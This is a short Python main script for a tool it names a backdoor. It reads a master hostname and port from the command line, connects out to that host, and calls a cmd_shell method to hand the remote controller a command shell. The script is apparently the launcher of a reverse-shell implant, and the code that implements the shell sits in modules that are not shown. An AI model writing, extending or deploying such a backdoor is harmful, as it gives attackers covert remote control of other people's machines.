#!/bin/usr/python3

from lib.connection import Connection
from lib.cli import CLI
from lib.backdoor import Backdoor

def main():
    cli = CLI()

    connection = Connection(cli.master_hostname, cli.master_port)
    conn = connection.connect_master()

    backdoor = Backdoor(connection.conn, cli.master_hostname, cli.master_port)
    backdoor.cmd_shell()

    return 0

if __name__ == "__main__":
    main()